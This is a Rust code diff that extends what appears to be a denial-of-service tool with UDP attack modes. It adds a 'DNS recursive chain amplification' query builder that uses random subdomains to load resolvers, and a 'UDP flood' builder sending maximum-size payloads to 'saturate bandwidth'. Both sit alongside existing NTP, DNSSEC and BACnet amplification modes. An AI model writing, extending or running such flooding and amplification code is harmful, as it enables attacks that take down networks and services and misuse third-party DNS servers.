@@ -26,6 +26,8 @@ pub enum UdpMode {
     BacnetDiscovery,
     NtpReadVar,
     DnsDnssec,
+    DnsRecursiveChain,
+    UdpFlood,
     GenericUdp,
 }
 
@@ -55,6 +57,8 @@ impl UdpMode {
             UdpMode::BacnetDiscovery => "BACnet device discovery",
             UdpMode::NtpReadVar => "NTP READVAR amplification",
             UdpMode::DnsDnssec => "DNS DNSSEC query amplification",
+            UdpMode::DnsRecursiveChain => "DNS recursive chain amplification",
+            UdpMode::UdpFlood => "UDP flood",
             UdpMode::GenericUdp => "UDP datagram flood",
         }
     }
@@ -81,6 +85,8 @@ impl UdpMode {
             UdpMode::BacnetDiscovery => 47808,
             UdpMode::NtpReadVar => 123,
             UdpMode::DnsDnssec => 53,
+            UdpMode::DnsRecursiveChain => 53,
+            UdpMode::UdpFlood => 0,
             UdpMode::GenericUdp => 12345,
         }
     }
@@ -461,6 +467,8 @@ async fn run_udp_protocol(mode: UdpMode, host: &str, port: u16) -> Result<(usize
         UdpMode::BacnetDiscovery => build_bacnet_whois(),
         UdpMode::NtpReadVar => build_ntp_readvar(),
         UdpMode::DnsDnssec => build_dns_dnssec(),
+        UdpMode::DnsRecursiveChain => build_dns_recursive(),
+        UdpMode::UdpFlood => build_udp_flood(),
         UdpMode::GenericUdp => {
             // Send a small datagram, read what comes back
             let sent = socket.send_to(b"hello", &target_addr)
@@ -1085,5 +1093,54 @@ fn build_dns_dnssec() -> Vec<u8> {
     // Data length: 0
     pkt.extend_from_slice(&[0x00, 0x00]);
 
+    pkt
+}
+
+
+// ================================================================
+// DNS recursive chain response /53
+// Sends a recursive DNS query that gets forwarded through resolvers
+// Each resolver adds overhead and the final response comes back
+// through the entire chain.
+// ================================================================
+fn build_dns_recursive() -> Vec<u8> {
+    let mut pkt = Vec::new();
+
+    // Transaction ID (random)
+    pkt.extend_from_slice(&(rand::random::<u16>()).to_be_bytes());
+    // Flags: 0x0100 = recursion desired, standard query
+    pkt.extend_from_slice(&[0x01, 0x00]);
+    // Questions: 1
+    pkt.extend_from_slice(&[0x00, 0x01]);
+    // Answer RRs: 0
+    pkt.extend_from_slice(&[0x00, 0x00]);
+    // Authority RRs: 0
+    pkt.extend_from_slice(&[0x00, 0x00]);
+    // Additional RRs: 0
+    pkt.extend_from_slice(&[0x00, 0x00]);
+
+    // Query name: random subdomain (forces resolver to walk the chain)
+    let label = format!("vrfy{}.", rand::random::<u32>());
+    for part in label.split('.') {
+        pkt.push(part.len() as u8);
+        pkt.extend_from_slice(part.as_bytes());
+    }
+    pkt.push(0x00); // root label
+
+    // Query type: A (1)
+    pkt.extend_from_slice(&[0x00, 0x01]);
+    // Query class: IN (1)
+    pkt.extend_from_slice(&[0x00, 0x01]);
+
+    pkt
+}
+
+// ================================================================
+// UDP flood - sends raw data to saturate bandwidth
+// No amplification expected, just volumetric
+// ================================================================
+fn build_udp_flood() -> Vec<u8> {
+    // Large payload to maximize bandwidth usage
+    let mut pkt = vec![0u8; 1472]; // max unfragmented UDP payload
     pkt
 }
